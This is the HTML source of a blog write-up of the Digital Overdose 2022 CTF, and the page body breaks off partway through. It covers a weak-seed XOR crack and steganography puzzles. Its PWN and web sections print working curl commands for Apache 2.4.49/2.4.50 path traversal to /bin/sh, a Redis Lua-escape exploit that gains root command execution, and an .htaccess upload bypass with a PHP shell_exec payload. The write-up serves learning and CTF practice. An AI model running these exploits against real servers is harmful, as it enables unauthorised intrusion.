@@ -1,0 +1,544 @@
+<!DOCTYPE html>
+<html lang="en" dir="auto">
+
+<head><meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+<meta name="robots" content="index, follow">
+<title>Digital Overdose 2022 Automn CTF | Luhko</title>
+<meta name="keywords" content="">
+<meta name="description" content="Cryptography Lightning Seeds We have this encryption script:
+#!/usr/bin/env python3 import random with open(&#39;flag.txt&#39;, &#39;r&#39;) as f: flag = f.read() seed = random.randint(0,999) random.seed(seed) encrypted = &#39;&#39;.join(f&#39;{(ord(c) ^ random.randint(0,255)):02x}&#39; for c in flag) with open(&#39;out.txt&#39;, &#39;w&#39;) as f: f.write(encrypted) # encrypted flag :4fcbac835550403f13c4cc337d8d8da48351921dfb7cd47d33857432c2ee665d821227 The problem here is the generation of the seed: only 1000 different values are possible. It will result in a weak encryption with only 1000 different keys:">
+<meta name="author" content="">
+<link rel="canonical" href="https://luhko.github.io/write-up/digitaloverdose/">
+<link crossorigin="anonymous" href="/assets/css/stylesheet.41f2d211c00e636a3c229c52ef2d4299a66891ae66771098993b13bca7972ae6.css" integrity="sha256-QfLSEcAOY2o8IpxS7y1CmaZoka5mdxCYmTsTvKeXKuY=" rel="preload stylesheet" as="style">
+<script defer crossorigin="anonymous" src="/assets/js/highlight.f413e19d0714851f6474e7ee9632408e58ac146fbdbe62747134bea2fa3415e0.js" integrity="sha256-9BPhnQcUhR9kdOfuljJAjlisFG&#43;9vmJ0cTS&#43;ovo0FeA="
+    onload="hljs.initHighlightingOnLoad();"></script>
+<link rel="icon" href="https://luhko.github.io/favicon.ico">
+<link rel="icon" type="image/png" sizes="16x16" href="https://luhko.github.io/favicon-16x16.png">
+<link rel="icon" type="image/png" sizes="32x32" href="https://luhko.github.io/favicon-32x32.png">
+<link rel="apple-touch-icon" href="https://luhko.github.io/apple-touch-icon.png">
+<link rel="mask-icon" href="https://luhko.github.io/safari-pinned-tab.svg">
+<meta name="theme-color" content="#2e2e33">
+<meta name="msapplication-TileColor" content="#2e2e33">
+<noscript>
+    <style>
+        #theme-toggle,
+        .top-link {
+            display: none;
+        }
+
+    </style>
+    <style>
+        @media (prefers-color-scheme: dark) {
+            :root {
+                --theme: rgb(29, 30, 32);
+                --entry: rgb(46, 46, 51);
+                --primary: rgb(218, 218, 219);
+                --secondary: rgb(155, 156, 157);
+                --tertiary: rgb(65, 66, 68);
+                --content: rgb(196, 196, 197);
+                --hljs-bg: rgb(46, 46, 51);
+                --code-bg: rgb(55, 56, 62);
+                --border: rgb(51, 51, 51);
+            }
+
+            .list {
+                background: var(--theme);
+            }
+
+            .list:not(.dark)::-webkit-scrollbar-track {
+                background: 0 0;
+            }
+
+            .list:not(.dark)::-webkit-scrollbar-thumb {
+                border-color: var(--theme);
+            }
+        }
+
+    </style>
+</noscript><meta property="og:title" content="Digital Overdose 2022 Automn CTF" />
+<meta property="og:description" content="Cryptography Lightning Seeds We have this encryption script:
+#!/usr/bin/env python3 import random with open(&#39;flag.txt&#39;, &#39;r&#39;) as f: flag = f.read() seed = random.randint(0,999) random.seed(seed) encrypted = &#39;&#39;.join(f&#39;{(ord(c) ^ random.randint(0,255)):02x}&#39; for c in flag) with open(&#39;out.txt&#39;, &#39;w&#39;) as f: f.write(encrypted) # encrypted flag :4fcbac835550403f13c4cc337d8d8da48351921dfb7cd47d33857432c2ee665d821227 The problem here is the generation of the seed: only 1000 different values are possible. It will result in a weak encryption with only 1000 different keys:" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://luhko.github.io/write-up/digitaloverdose/" /><meta property="article:section" content="write-up" />
+<meta property="article:published_time" content="2022-11-20T23:43:49&#43;02:00" />
+<meta property="article:modified_time" content="2022-11-20T23:43:49&#43;02:00" />
+
+<meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="Digital Overdose 2022 Automn CTF"/>
+<meta name="twitter:description" content="Cryptography Lightning Seeds We have this encryption script:
+#!/usr/bin/env python3 import random with open(&#39;flag.txt&#39;, &#39;r&#39;) as f: flag = f.read() seed = random.randint(0,999) random.seed(seed) encrypted = &#39;&#39;.join(f&#39;{(ord(c) ^ random.randint(0,255)):02x}&#39; for c in flag) with open(&#39;out.txt&#39;, &#39;w&#39;) as f: f.write(encrypted) # encrypted flag :4fcbac835550403f13c4cc337d8d8da48351921dfb7cd47d33857432c2ee665d821227 The problem here is the generation of the seed: only 1000 different values are possible. It will result in a weak encryption with only 1000 different keys:"/>
+
+
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BreadcrumbList",
+  "itemListElement": [, 
+    {
+      "@type": "ListItem",
+      "position":  2 ,
+      "name": "Digital Overdose 2022 Automn CTF",
+      "item": "https://luhko.github.io/write-up/digitaloverdose/"
+    }
+  ]
+}
+</script>
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BlogPosting",
+  "headline": "Digital Overdose 2022 Automn CTF",
+  "name": "Digital Overdose 2022 Automn CTF",
+  "description": "Cryptography Lightning Seeds We have this encryption script:\n#!/usr/bin/env python3 import random with open(\u0026#39;flag.txt\u0026#39;, \u0026#39;r\u0026#39;) as f: flag = f.read() seed = random.randint(0,999) random.seed(seed) encrypted = \u0026#39;\u0026#39;.join(f\u0026#39;{(ord(c) ^ random.randint(0,255)):02x}\u0026#39; for c in flag) with open(\u0026#39;out.txt\u0026#39;, \u0026#39;w\u0026#39;) as f: f.write(encrypted) # encrypted flag :4fcbac835550403f13c4cc337d8d8da48351921dfb7cd47d33857432c2ee665d821227 The problem here is the generation of the seed: only 1000 different values are possible. It will result in a weak encryption with only 1000 different keys:",
+  "keywords": [
+    
+  ],
+  "articleBody": "Cryptography Lightning Seeds We have this encryption script:\n#!/usr/bin/env python3 import random with open('flag.txt', 'r') as f: flag = f.read() seed = random.randint(0,999) random.seed(seed) encrypted = ''.join(f'{(ord(c) ^ random.randint(0,255)):02x}' for c in flag) with open('out.txt', 'w') as f: f.write(encrypted) # encrypted flag :4fcbac835550403f13c4cc337d8d8da48351921dfb7cd47d33857432c2ee665d821227 The problem here is the generation of the seed: only 1000 different values are possible. It will result in a weak encryption with only 1000 different keys:\n#!/usr/bin/env python3 import random import binascii for i in range(0,1000): encrypted = \"\\x4f\\xcb\\xac\\x83\\x55\\x50\\x40\\x3f\\x13\\xc4\\xcc\\x33\\x7d\\x8d\\x8d\\xa4\\x83\\x51\\x92\\x1d\\xfb\\x7c\\xd4\\x7d\\x33\\x85\\x74\\x32\\xc2\\xee\\x66\\x5d\\x82\\x12\\x27\" random.seed(i) flag = ''.join(f'{(ord(c) ^ random.randint(0,255)):02x}' for c in encrypted) flag = binascii.unhexlify(flag) if b\"DCTF\" in flag: print(flag) Execute it and then get the flag:\n$ python3 exploit.py b'DOCTF{n0t_4s_r4nd0m_4s_y0u_th1nk!}\\n' Steganography Arrow We were given an image. If you stringson it:\n$ string arrow.jpg | head ... solve the problem,find (x) value || encryptype : t0R f(x)=x^2-4x+3 || sdvvrug : qrmlq (hint: highest (x) value is correct) ... Let’s try to identify the encoding:\nIf we use this password on the image using steghide, we get a .txt file:\ncongrats!!!! good job. Now you should answer some EZ questions. It's about computer parts . It can help you to learn something, or if you already know, you can easily pass this section! The zip file password is the answer to one of these questions: 1. Which component on the Motherboard generates the most heat? (hint:three letters) 2. What is the name of the fastest cache on the motherboard? 3. What is the maximum amount of DRAM that a 32-bit system can support? 4. The LGP CPU is mostly used by which company? (Hint: there are two companies that build CPUs; one of them is the answer!) Four simple questions. :) But u should know that this is not the last task..... I will give u some hint, inside the zip file there is a sound track and a photo get the code from the audio file and get access to the file inside the photo.. Ik u are saying where tf is the zip file?? Its on my Github repository waiting for you.(hint : ARROW#5141) good luck... So we have :\n 4 questions to answer One zip file to find  The answers are respectively :\n CPU (or GPU) L1 4GB Intel or AMD  Now let’s try to find the zip. The hint looks like a discord username, so I added him. Our request is almost instantly accepted, and his profile looks like this:\nHere we go, a github link, with a zip file. Now let’s try our passwords… Intel is the good one.\nInside the zip, there is a .wav and a .jpg. The hint told us that we have to find the password in the wav file …\nIf we look at the spectrogram:\nIt sounds and looks like a dial number. Maybe 445599, a steghide password again ?\nIf we use it on the image, a file named flag.wav is extracted. We just need to view its spectrogram to get the flag :\nIt’s hidden This steganography challenge is about a text which contains 0-width spaces. This text is in fact more than 2100 chars long: ███████████████████████████\nI struggled to find out the solution, but one of my mates told me that I should count the number of 0-width space between the black char … and It worked!\nPWN RFC 2616’s Daemons - 1 Let’s identify what service is running:\n$ nmap -p 42687 -Pn -sV 193.57.**.** Nmap scan report for 193.57.**.** Host is up (0.025s latency). PORT STATE SERVICE VERSION 42687/tcp open http Apache httpd 2.4.49 ((Unix)) We find out that it’s an Apache httpd 2.4.49. This apache version is well-known for its path traversal and RCE if cgi-bin is enabled. We just need to do a path traversal with encoded dots:\n$ curl -s --path-as-is -d \"echo Content-Type: text/plain; echo; cat /home/flag.txt\" http://193.57.159.27:47252/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/bin/sh DOCTF{muffintop} RFC 2616’s Daemons - 2 Let’s identify what service is running:\n$ nmap -p 40460 -Pn -sV 193.57.**.** Nmap scan report for 193.57.**.** Host is up (0.024s latency). PORT STATE SERVICE VERSION 40460/tcp open http Apache httpd 2.4.50 ((Unix)) We find out that it’s an Apache httpd 2.4.50. This apache version is a failed patch of the previous vulnerability; we just need to double encode the dots to bypass the patch:\n$ curl -s --path-as-is -d \"echo Content-Type: text/plain; echo; cat /home/flag.txt\" http://193.57.159.27:40460/cgi-bin/%%32%65%%32%65/%%32%65%%32%65/%%32%65 %%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/bin/sh DOCTF{pizzapie} RFC 2616’s Smol Daemons Let’s identify what service is running:\n$ nmap -p 31332 -Pn -sV 193.57.**.** Starting Nmap 7.80 ( https://nmap.org ) at 2022-11-21 23:31 CET Nmap scan report for 193.57.**.** Host is up (0.027s latency). PORT STATE SERVICE VERSION 31332/tcp open http mini_httpd 1.29 23May2018 If we look for an exploit about mini_httpd 1.29, we can find the CVE-2018-18778.\nJust set the Host to empty and request the file you want to achieve arbitrary file reading:\nFR: Say it again! Let’s identify what service is running:\n$ nmap -p 37826 -Pn -sV 193.57.**.** Starting Nmap 7.80 ( https://nmap.org ) at 2022-11-21 23:27 CET Nmap scan report for 193.57.**.** Host is up (0.025s latency). PORT STATE SERVICE VERSION 37826/tcp open redis Redis key-value store We have a redis instance. We can connect with redis-cli but the interesting thing is the execution of sandboxed LUA script:\n EVAL dofile('/etc/passwd') 0 Unfortunately, this is not working anymore. But while searching for another solution, I found out that there is the CVE-2022-0543 which allow us to escape the LUA restriction:\n$ python3 CVE-2022-0543.py [#] Create By :: _ _ ___ __ ____ / \\  _ __ __ _ ___| | / _ \\ / _| | _ \\  ___ _ __ ___ ___ _ __ / _ \\ | '_ \\ / _` |/ _ \\ | | | | | |_ | | | |/ _ \\ '_ ` _ \\ / _ \\| '_ \\ / ___ \\| | | | (_| | __/ | | |_| | _| | |_| | __/ | | | | | (_) | | | | /_/ \\_\\_| |_|\\__, |\\___|_| \\___/|_| |____/ \\___|_| |_| |_|\\___/|_| |_| |___/ By https://aodsec.com Please input redis ip: 193.57.**.** Please input redis port: 43641 input exec cmd:(q-exit) id b'uid=0(root) gid=0(root) groups=0(root)\\n' input exec cmd:(q-exit) cat /root/flag.txt b'DOCTF{R3D1S_MO1_CA_3N_4NGL41S}' input exec cmd:(q-exit) Es-Es-Sigh We have a basic page which allow us to upload files..phpextension is not allowed, and usual tricks such as:\n Modify Content-Type in POST request file.php.png file.png.php file.php%00 file.php./ file.PHP etc.  were not working (PHP was not executed). So I tried to upload a .htaccess, which will allow us to interprete some other extension as PHP:\n$ cat .htaccess AddType application/x-httpd-php .php16 Upload is successful, and now .php16 will be executed as PHP. Then you can get the flag with the following payload:\n$ cat flag.php16 ?php echo shell_exec(\"cat /home/flag.txt\"); ? ",
+  "wordCount" : "1128",
+  "inLanguage": "en",
+  "datePublished": "2022-11-20T23:43:49+02:00",
+  "dateModified": "2022-11-20T23:43:49+02:00",
+  "mainEntityOfPage": {
+    "@type": "WebPage",
+    "@id": "https://luhko.github.io/write-up/digitaloverdose/"
+  },
+  "publisher": {
+    "@type": "Organization",
+    "name": "Luhko",
+    "logo": {
+      "@type": "ImageObject",
+      "url": "https://luhko.github.io/favicon.ico"
+    }
+  }
+}
+</script>
+</head>
+
+<body class="" id="top">
+<script>
+    if (localStorage.getItem("pref-theme") === "dark") {
+        document.body.classList.add('dark');
+    } else if (localStorage.getItem("pref-theme") === "light") {
+        document.body.classList.remove('dark')
+    } else if (window.matchMedia('(prefers-color-scheme: dark)').matches) {
+        document.body.classList.add('dark');
+    }
+
+</script>
+
+<header class="header">
+    <nav class="nav">
+        <div class="logo">
+            <a href="https://luhko.github.io/" accesskey="h" title="Luhko (Alt + H)">Luhko</a>
+            <div class="logo-switches">
+                <button id="theme-toggle" accesskey="t" title="(Alt + T)">
+                    <svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path>
+                    </svg>
+                    <svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <circle cx="12" cy="12" r="5"></circle>
+                        <line x1="12" y1="1" x2="12" y2="3"></line>
+                        <line x1="12" y1="21" x2="12" y2="23"></line>
+                        <line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line>
+                        <line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line>
+                        <line x1="1" y1="12" x2="3" y2="12"></line>
+                        <line x1="21" y1="12" x2="23" y2="12"></line>
+                        <line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line>
+                        <line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
+                    </svg>
+                </button>
+            </div>
+        </div>
+        <ul id="menu">
+            <li>
+                <a href="https://luhko.github.io/articles" title="Articles">
+                    <span>Articles</span>
+                </a>
+            </li>
+            <li>
+                <a href="https://luhko.github.io/write-up" title="Write-Up">
+                    <span>Write-Up</span>
+                </a>
+            </li>
+        </ul>
+    </nav>
+</header>
+<main class="main">
+
+<article class="post-single">
+  <header class="post-header">
+    <div class="breadcrumbs"><a href="https://luhko.github.io/">Home</a></div>
+    <h1 class="post-title">
+      Digital Overdose 2022 Automn CTF
+    </h1>
+    <div class="post-meta"><span title='2022-11-20 23:43:49 +0200 +0200'>November 20, 2022</span>&nbsp;·&nbsp;6 min
+
+</div>
+  </header> <div class="toc">
+    <details >
+        <summary accesskey="c" title="(Alt + C)">
+            <span class="details">Table of Contents</span>
+        </summary>
+
+        <div class="inner"><ul>
+                <li>
+                    <a href="#cryptography" aria-label="Cryptography">Cryptography</a><ul>
+                        
+                <li>
+                    <a href="#lightning-seeds" aria-label="Lightning Seeds">Lightning Seeds</a></li></ul>
+                </li>
+                <li>
+                    <a href="#steganography" aria-label="Steganography">Steganography</a><ul>
+                        
+                <li>
+                    <a href="#arrow" aria-label="Arrow">Arrow</a></li>
+                <li>
+                    <a href="#its-hidden" aria-label="It’s hidden">It’s hidden</a></li></ul>
+                </li>
+                <li>
+                    <a href="#pwn" aria-label="PWN">PWN</a><ul>
+                        
+                <li>
+                    <a href="#rfc-2616s-daemons---1" aria-label="RFC 2616’s Daemons - 1">RFC 2616’s Daemons - 1</a></li>
+                <li>
+                    <a href="#rfc-2616s-daemons---2" aria-label="RFC 2616’s Daemons - 2">RFC 2616’s Daemons - 2</a></li>
+                <li>
+                    <a href="#rfc-2616s-smol-daemons" aria-label="RFC 2616&amp;rsquo;s Smol Daemons"><strong><strong>RFC 2616&rsquo;s Smol Daemons</strong></strong></a></li>
+                <li>
+                    <a href="#fr-say-it-again" aria-label="FR: Say it again!">FR: Say it again!</a></li></ul>
+                </li>
+                <li>
+                    <a href="#es-es-sigh" aria-label="Es-Es-Sigh">Es-Es-Sigh</a>
+                </li>
+            </ul>
+        </div>
+    </details>
+</div>
+
+  <div class="post-content"><h1 id="cryptography">Cryptography<a hidden class="anchor" aria-hidden="true" href="#cryptography">#</a></h1>
+<h2 id="lightning-seeds">Lightning Seeds<a hidden class="anchor" aria-hidden="true" href="#lightning-seeds">#</a></h2>
+<p>We have this encryption script:</p>
+<div class="highlight"><pre class="chroma"><code class="language-bash" data-lang="bash"><span class="cp">#!/usr/bin/env python3
+</span><span class="cp"></span>import random
+
+with open<span class="o">(</span><span class="s1">&#39;flag.txt&#39;</span>, <span class="s1">&#39;r&#39;</span><span class="o">)</span> as f:
+    <span class="nv">flag</span> <span class="o">=</span> f.read<span class="o">()</span>
+
+<span class="nv">seed</span> <span class="o">=</span> random.randint<span class="o">(</span>0,999<span class="o">)</span>
+random.seed<span class="o">(</span>seed<span class="o">)</span>
+
+<span class="nv">encrypted</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span>.join<span class="o">(</span>f<span class="s1">&#39;{(ord(c) ^ random.randint(0,255)):02x}&#39;</span> <span class="k">for</span> c in flag<span class="o">)</span>
+
+with open<span class="o">(</span><span class="s1">&#39;out.txt&#39;</span>, <span class="s1">&#39;w&#39;</span><span class="o">)</span> as f:
+    f.write<span class="o">(</span>encrypted<span class="o">)</span>
+
+<span class="c1"># encrypted flag :4fcbac835550403f13c4cc337d8d8da48351921dfb7cd47d33857432c2ee665d821227</span>
+</code></pre></div><p>The problem here is the generation of the seed: only 1000 different values are possible. It will result in a weak encryption with only 1000 different keys:</p>
+<div class="highlight"><pre class="chroma"><code class="language-python" data-lang="python"><span class="ch">#!/usr/bin/env python3</span>
+<span class="kn">import</span> <span class="nn">random</span>
+<span class="kn">import</span> <span class="nn">binascii</span>
+
+<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="mi">1000</span><span class="p">):</span>
+    <span class="n">encrypted</span> <span class="o">=</span> <span class="s2">&#34;</span><span class="se">\x4f\xcb\xac\x83\x55\x50\x40\x3f\x13\xc4\xcc\x33\x7d\x8d\x8d\xa4\x83\x51\x92\x1d\xfb\x7c\xd4\x7d\x33\x85\x74\x32\xc2\xee\x66\x5d\x82\x12\x27</span><span class="s2">&#34;</span>
+    <span class="n">random</span><span class="o">.</span><span class="n">seed</span><span class="p">(</span><span class="n">i</span><span class="p">)</span>
+    <span class="n">flag</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="n">f</span><span class="s1">&#39;{(ord(c) ^ random.randint(0,255)):02x}&#39;</span> <span class="k">for</span> <span class="n">c</span> <span class="ow">in</span> <span class="n">encrypted</span><span class="p">)</span>
+	  <span class="n">flag</span> <span class="o">=</span> <span class="n">binascii</span><span class="o">.</span><span class="n">unhexlify</span><span class="p">(</span><span class="n">flag</span><span class="p">)</span>
+    <span class="k">if</span> <span class="sa">b</span><span class="s2">&#34;DCTF&#34;</span> <span class="ow">in</span> <span class="n">flag</span><span class="p">:</span>
+					<span class="k">print</span><span class="p">(</span><span class="n">flag</span><span class="p">)</span>
+</code></pre></div><p>Execute it and then get the flag:</p>
+<div class="highlight"><pre class="chroma"><code class="language-python" data-lang="python"><span class="err">$</span> <span class="n">python3</span> <span class="n">exploit</span><span class="o">.</span><span class="n">py</span>
+<span class="sa">b</span><span class="s1">&#39;DOCTF{n0t_4s_r4nd0m_4s_y0u_th1nk!}</span><span class="se">\n</span><span class="s1">&#39;</span>
+</code></pre></div><h1 id="steganography">Steganography<a hidden class="anchor" aria-hidden="true" href="#steganography">#</a></h1>
+<h2 id="arrow">Arrow<a hidden class="anchor" aria-hidden="true" href="#arrow">#</a></h2>
+<p>We were given an image. If you <code>strings</code>on it:</p>
+<div class="highlight"><pre class="chroma"><code class="language-bash" data-lang="bash">$ string arrow.jpg <span class="p">|</span> head
+...
+&lt;xmpRights:Certificate&gt;solve the problem,find <span class="o">(</span>x<span class="o">)</span> value <span class="o">||</span> encryptype : t0R f<span class="o">(</span>x<span class="o">)=</span>x^2-4x+3 <span class="o">||</span> sdvvrug : qrmlq <span class="o">(</span>hint: highest <span class="o">(</span>x<span class="o">)</span> value is correct<span class="o">)</span>&lt;/xmpRights:Certificate&gt;
+...
+</code></pre></div><p>Let’s try to identify the encoding:</p>
+<p><img loading="lazy" src="/overdose_data/0.png" alt="Untitled"  />
+</p>
+<p><img loading="lazy" src="/overdose_data/1.png" alt="Untitled"  />
+</p>
+<p>If we use this password on the image using <code>steghide</code>, we get a <code>.txt</code> file:</p>
+<div class="highlight"><pre class="chroma"><code class="language-bash" data-lang="bash">congrats!!!! good job.
+
+Now you should answer some EZ questions. It<span class="err">&#39;</span>s about computer parts . It can <span class="nb">help</span> you to learn something, or <span class="k">if</span> you already know, you can easily pass this section!
+The zip file password is the answer to one of these questions:
+
+1. Which component on the Motherboard generates the most heat? <span class="o">(</span>hint:three letters<span class="o">)</span>
+2. What is the name of the fastest cache on the motherboard?
+3. What is the maximum amount of DRAM that a 32-bit system can support?
+4. The LGP CPU is mostly used by which company? <span class="o">(</span>Hint: there are two companies that build CPUs<span class="p">;</span> one of them is the answer!<span class="o">)</span>
+
+Four simple questions. :<span class="o">)</span>
+But u should know that this is not the last task.....
+I will give u some hint, inside the zip file there is a sound track and a photo get the code from the audio file and get access to the file inside the photo.. 
+Ik u are saying where tf is the zip file??
+Its on my Github repository waiting <span class="k">for</span> you.<span class="o">(</span>hint : ARROW#5141<span class="o">)</span> 
+good luck...
+</code></pre></div><p>So we have :</p>
+<ul>
+<li>4 questions to answer</li>
+<li>One zip file to find</li>
+</ul>
+<p>The answers are respectively :</p>
+<ul>
+<li>CPU (or GPU)</li>
+<li>L1</li>
+<li>4GB</li>
+<li>Intel or AMD</li>
+</ul>
+<p>Now let’s try to find the zip. The hint looks like a discord username, so I added him. Our request is almost instantly accepted, and his profile looks like this:</p>
+<p><img loading="lazy" src="/overdose_data/2.png" alt="Untitled"  />
+</p>
+<p>Here we go, a github link, with a zip file. Now let’s try our passwords… Intel is the good one.</p>
+<p>Inside the zip, there is a <code>.wav</code> and a <code>.jpg</code>. The hint told us that we have to find the password in the wav file …</p>
+<p>If we look at the spectrogram:</p>
+<p><img loading="lazy" src="/overdose_data/3.png" alt="Untitled"  />
+</p>
+<p>It sounds and looks like a dial number. Maybe 445599, a steghide password again ?</p>
+<p>If we use it on the image, a file named <code>flag.wav</code> is extracted. We just need to view its spectrogram to get the flag :</p>
+<p><img loading="lazy" src="/overdose_data/4.png" alt="Untitled"  />
+</p>
+<h2 id="its-hidden">It’s hidden<a hidden class="anchor" aria-hidden="true" href="#its-hidden">#</a></h2>
+<p>This steganography challenge is about a text which contains 0-width spaces. This text is in fact more than 2100 chars long: ███████████████████████████</p>
+<p>I struggled to find out the solution, but one of my mates told me that I should count the number of 0-width space between the black char … and It worked!</p>
+<p><img loading="lazy" src="/overdose_data/5.png" alt="Untitled"  />
+</p>
+<p><img loading="lazy" src="/overdose_data/6.png" alt="Untitled"  />
+</p>
+<h1 id="pwn">PWN<a hidden class="anchor" aria-hidden="true" href="#pwn">#</a></h1>
+<h2 id="rfc-2616s-daemons---1">RFC 2616’s Daemons - 1<a hidden class="anchor" aria-hidden="true" href="#rfc-2616s-daemons---1">#</a></h2>
+<p>Let’s identify what service is running:</p>
+<div class="highlight"><pre class="chroma"><code class="language-bash" data-lang="bash">$ nmap -p <span class="m">42687</span> -Pn -sV 193.57.**.**
+Nmap scan report <span class="k">for</span> 193.57.**.**
+Host is up <span class="o">(</span>0.025s latency<span class="o">)</span>.
+
+PORT      STATE SERVICE VERSION
+42687/tcp open  http    Apache httpd 2.4.49 <span class="o">((</span>Unix<span class="o">))</span>
+</code></pre></div><p>We find out that it’s an <strong>Apache httpd 2.4.49</strong>. This apache version is well-known for its path traversal and RCE if <code>cgi-bin</code> is enabled. We just need to do a path traversal with encoded dots:</p>
+<div class="highlight"><pre class="chroma"><code class="language-bash" data-lang="bash">$ curl -s --path-as-is -d <span class="s2">&#34;echo Content-Type: text/plain; echo; cat /home/flag.txt&#34;</span> http://193.57.159.27:47252/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/bin/sh
+DOCTF<span class="o">{</span>muffintop<span class="o">}</span>
+</code></pre></div><h2 id="rfc-2616s-daemons---2">RFC 2616’s Daemons - 2<a hidden class="anchor" aria-hidden="true" href="#rfc-2616s-daemons---2">#</a></h2>
+<p>Let’s identify what service is running:</p>
+<div class="highlight"><pre class="chroma"><code class="language-bash" data-lang="bash">$ nmap -p <span class="m">40460</span> -Pn -sV 193.57.**.**
+Nmap scan report <span class="k">for</span> 193.57.**.**
+Host is up <span class="o">(</span>0.024s latency<span class="o">)</span>.
+
+PORT      STATE  SERVICE VERSION
+40460/tcp open  http    Apache httpd 2.4.50 <span class="o">((</span>Unix<span class="o">))</span>
+</code></pre></div><p>We find out that it’s an <strong>Apache httpd 2.4.50</strong>. This apache version is a failed patch of the previous vulnerability; we just need to double encode the dots to bypass the patch:</p>
+<div class="highlight"><pre class="chroma"><code class="language-bash" data-lang="bash">$ curl -s --path-as-is -d <span class="s2">&#34;echo Content-Type: text/plain; echo; cat /home/flag.txt&#34;</span> http://193.57.159.27:40460/cgi-bin/%%32%65%%32%65/%%32%65%%32%65/%%32%65
+%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/bin/sh
+DOCTF<span class="o">{</span>pizzapie<span class="o">}</span>
+</code></pre></div><h2 id="rfc-2616s-smol-daemons"><strong><strong>RFC 2616&rsquo;s Smol Daemons</strong></strong><a hidden class="anchor" aria-hidden="true" href="#rfc-2616s-smol-daemons">#</a></h2>
+<p>Let’s identify what service is running:</p>
+<div class="highlight"><pre class="chroma"><code class="language-bash" data-lang="bash">$ nmap -p <span class="m">31332</span> -Pn -sV 193.57.**.**
+Starting Nmap 7.80 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2022-11-21 23:31 CET
+Nmap scan report <span class="k">for</span> 193.57.**.**
+Host is up <span class="o">(</span>0.027s latency<span class="o">)</span>.
+
+PORT      STATE SERVICE VERSION
+31332/tcp open  http    mini_httpd 1.29 23May2018
+</code></pre></div><p>If we look for an exploit about mini_httpd 1.29, we can find the CVE-2018-18778.</p>
+<p>Just set the <strong>Host</strong> to empty and request the file you want to achieve arbitrary file reading:</p>
+<p><img loading="lazy" src="/overdose_data/7.png" alt="Untitled"  />
+</p>
+<h2 id="fr-say-it-again">FR: Say it again!<a hidden class="anchor" aria-hidden="true" href="#fr-say-it-again">#</a></h2>
+<p>Let’s identify what service is running:</p>
+<div class="highlight"><pre class="chroma"><code class="language-bash" data-lang="bash">$ nmap -p <span class="m">37826</span> -Pn -sV 193.57.**.**
+Starting Nmap 7.80 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2022-11-21 23:27 CET
+Nmap scan report <span class="k">for</span> 193.57.**.**
+Host is up <span class="o">(</span>0.025s latency<span class="o">)</span>.
+
+PORT      STATE SERVICE VERSION
+37826/tcp open  redis   Redis key-value store
+</code></pre></div><p>We have a redis instance. We can connect with <code>redis-cli</code> but the interesting thing is the <a href="https://www.agarri.fr/blog/archives/2014/09/11/trying_to_hack_redis_via_http_requests/index.html">execution</a> of sandboxed LUA script:</p>
+<div class="highlight"><pre class="chroma"><code class="language-bash" data-lang="bash">&gt; EVAL dofile<span class="o">(</span><span class="s1">&#39;/etc/passwd&#39;</span><span class="o">)</span> <span class="m">0</span>
+</code></pre></div><p>Unfortunately, this is not working anymore. But while searching for another solution, I found out that there is the CVE-2022-0543 which allow us to escape the LUA restriction:</p>
+<p><img loading="lazy" src="/overdose_data/8.png" alt="Untitled"  />
+</p>
+<div class="highlight"><pre class="chroma"><code class="language-bash" data-lang="bash">$ python3 CVE-2022-0543.py
+
+      <span class="o">[</span><span class="c1">#] Create By ::</span>
+        _                     _    ___   __   ____
+       / <span class="se">\ </span>  _ __   __ _  ___<span class="p">|</span> <span class="p">|</span>  / _ <span class="se">\ </span>/ _<span class="p">|</span> <span class="p">|</span>  _ <span class="se">\ </span> ___ _ __ ___   ___  _ __
+      / _ <span class="se">\ </span><span class="p">|</span> <span class="s1">&#39;_ \ / _` |/ _ \ | | | | | |_  | | | |/ _ \ &#39;</span>_ <span class="sb">`</span> _ <span class="se">\ </span>/ _ <span class="se">\|</span> <span class="s1">&#39;_ \
+</span><span class="s1">     / ___ \| | | | (_| |  __/ | | |_| |  _| | |_| |  __/ | | | | | (_) | | | |
+</span><span class="s1">    /_/   \_\_| |_|\__, |\___|_|  \___/|_|   |____/ \___|_| |_| |_|\___/|_| |_|
+</span><span class="s1">                   |___/            By https://aodsec.com
+</span><span class="s1">
+</span><span class="s1">Please input redis ip:
+</span><span class="s1">&gt;&gt;193.57.**.**
+</span><span class="s1">Please input redis port:
+</span><span class="s1">&gt;&gt;43641
+</span><span class="s1">input exec cmd:(q-&gt;exit)
+</span><span class="s1">&gt;&gt;id
